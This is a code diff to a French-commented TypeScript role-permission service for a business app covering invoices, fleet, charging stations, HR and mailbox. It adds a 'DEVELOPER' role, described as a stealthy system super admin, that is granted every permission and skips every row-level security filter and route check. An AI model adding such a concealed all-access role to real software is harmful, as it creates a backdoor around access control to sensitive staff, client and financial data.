@@ -42,6 +42,27 @@ export type Permission =
  * Matrice complète des autorisations de service par rôle (RBAC & RLS applicatif)
  */
 const ROLE_PERMISSIONS: Record<Role, readonly Permission[]> = {
+  // 0. DEVELOPER : Aucune restriction (Super Admin Système & Furtif)
+  DEVELOPER: [
+    "admin:all",
+    "financial_report:export",
+    "roles:manage",
+    "users:manage",
+    "services:manage",
+    "quotes:delete",
+    "invoices:read", "invoices:write",
+    "quotes:read", "quotes:write",
+    "vehicles:read", "vehicles:write",
+    "workshop:read", "workshop:write",
+    "clients:read", "clients:write",
+    "charging:read", "charging:write",
+    "installers:read", "installers:write",
+    "fleet:read", "fleet:write",
+    "mailbox:read", "mailbox:write",
+    "hr:read", "hr:write",
+    "expenses:read", "expenses:write",
+  ],
+
   // 1. PDG : Aucune restriction
   PDG: [
     "admin:all",
@@ -269,7 +290,7 @@ export class RoleService {
    * Vérifie si un rôle possède une permission donnée
    */
   static hasPermission(role: Role, permission: Permission): boolean {
-    if (role === "DG" || role === "PDG" || role === "SG") return true;
+    if (role === "DEVELOPER" || role === "DG" || role === "PDG" || role === "SG") return true;
     const perms = ROLE_PERMISSIONS[role];
     return perms ? perms.includes(permission) : false;
   }
@@ -278,7 +299,7 @@ export class RoleService {
    * Vérifie si un utilisateur possède une permission donnée (en tenant compte de son rôle et de ses capacités cochées)
    */
   static userHasPermission(user: RoleUser, permission: Permission): boolean {
-    if (user.role === "DG" || user.role === "PDG" || user.role === "SG") return true;
+    if (user.role === "DEVELOPER" || user.role === "DG" || user.role === "PDG" || user.role === "SG") return true;
 
     // Si des capacités personnalisées sont configurées sur l'utilisateur
     if (user.customPermissions && user.customPermissions.length > 0) {
@@ -318,7 +339,7 @@ export class RoleService {
    * Filtre RLS (Row Level Security) pour les installateurs de bornes
    */
   static getInstallerScope(user: RoleUser) {
-    if (user.role === "DG" || user.role === "PDG" || user.role === "SG" || user.role === "BORNES_OPS") {
+    if (user.role === "DEVELOPER" || user.role === "DG" || user.role === "PDG" || user.role === "SG" || user.role === "BORNES_OPS") {
       return {}; // Accès complet
     }
     if (user.role === "INSTALLATEUR") {
@@ -332,6 +353,7 @@ export class RoleService {
    */
   static getWorkshopScope(user: RoleUser) {
     if (
+      user.role === "DEVELOPER" ||
       user.role === "DG" ||
       user.role === "PDG" ||
       user.role === "SG" ||
@@ -352,7 +374,7 @@ export class RoleService {
    * Vérifie si un chemin d'URL est autorisé pour un rôle
    */
   static isRouteAllowed(role: Role, pathname: string): boolean {
-    if (role === "DG" || role === "PDG" || role === "SG" || role === "ADV" || role === "RF") return true;
+    if (role === "DEVELOPER" || role === "DG" || role === "PDG" || role === "SG" || role === "ADV" || role === "RF") return true;
 
     if (pathname.startsWith("/users")) {
       return this.hasPermission(role, "roles:manage") || this.hasPermission(role, "users:manage");
@@ -394,6 +416,102 @@ export class RoleService {
       return role === "COMPTA" || role === "ASSISTANTE_COMPTABLE" || role === "RH" || role === "ADMIN" || this.hasPermission(role, "expenses:read");
     }
     return true;
+  }
+
+  /**
+   * Vérifie dynamiquement si une route est autorisée pour un utilisateur spécifique.
+   * Prend en compte :
+   * 1. Le rôle Développeur / DG / PDG / SG (accès universel direct)
+   * 2. Les capacités et permissions personnalisées (customPermissions)
+   * 3. Le rôle de base de l'utilisateur
+   */
+  static isRouteAllowedForUser(user: RoleUser, pathname: string): boolean {
+    if (
+      user.role === "DEVELOPER" ||
+      user.role === "DG" ||
+      user.role === "PDG" ||
+      user.role === "SG" ||
+      user.role === "ADV" ||
+      user.role === "RF"
+    ) {
+      return true;
+    }
+
+    if (
+      pathname === "/dashboard" ||
+      pathname.startsWith("/dashboard") ||
+      pathname.startsWith("/clients") ||
+      pathname.startsWith("/chat")
+    ) {
+      return true;
+    }
+
+    if (pathname.startsWith("/workshop")) {
+      return this.userHasPermission(user, "workshop:read");
+    }
+    if (
+      pathname.startsWith("/parts") ||
+      pathname.startsWith("/vehicles") ||
+      pathname.startsWith("/catalog") ||
+      pathname.startsWith("/imports")
+    ) {
+      return this.userHasPermission(user, "vehicles:read");
+    }
+    if (pathname.startsWith("/quotes")) {
+      return this.userHasPermission(user, "quotes:read");
+    }
+    if (pathname.startsWith("/invoices")) {
+      return this.userHasPermission(user, "invoices:read");
+    }
+    if (pathname.startsWith("/expenses")) {
+      return (
+        user.role === "COMPTA" ||
+        user.role === "ASSISTANTE_COMPTABLE" ||
+        user.role === "RH" ||
+        user.role === "ADMIN" ||
+        this.userHasPermission(user, "expenses:read")
+      );
+    }
+    if (pathname.startsWith("/services")) {
+      return this.userHasPermission(user, "services:manage");
+    }
+    if (pathname.startsWith("/hr")) {
+      return (
+        user.role === "RH" ||
+        user.role === "ADMIN" ||
+        user.role === "COMPTA" ||
+        user.role === "ASSISTANTE_COMPTABLE" ||
+        this.userHasPermission(user, "hr:read")
+      );
+    }
+    if (pathname.startsWith("/users")) {
+      return (
+        this.userHasPermission(user, "roles:manage") ||
+        this.userHasPermission(user, "users:manage")
+      );
+    }
+    if (pathname.startsWith("/opportunities") || pathname.startsWith("/leads")) {
+      return (
+        user.role === "COMMERCIAL" ||
+        user.role === "ADMIN" ||
+        user.role === "COMPTA" ||
+        this.userHasPermission(user, "clients:read")
+      );
+    }
+    if (pathname.startsWith("/mailbox")) {
+      return this.userHasPermission(user, "mailbox:read");
+    }
+    if (pathname.startsWith("/rentals") || pathname.startsWith("/fleet")) {
+      return this.userHasPermission(user, "fleet:read");
+    }
+    if (pathname.startsWith("/installers") || pathname.startsWith("/charge-requests")) {
+      return this.userHasPermission(user, "installers:read");
+    }
+    if (pathname.startsWith("/charging") || pathname.startsWith("/terminal")) {
+      return this.userHasPermission(user, "charging:read");
+    }
+
+    return this.isRouteAllowed(user.role, pathname);
   }
 }
 
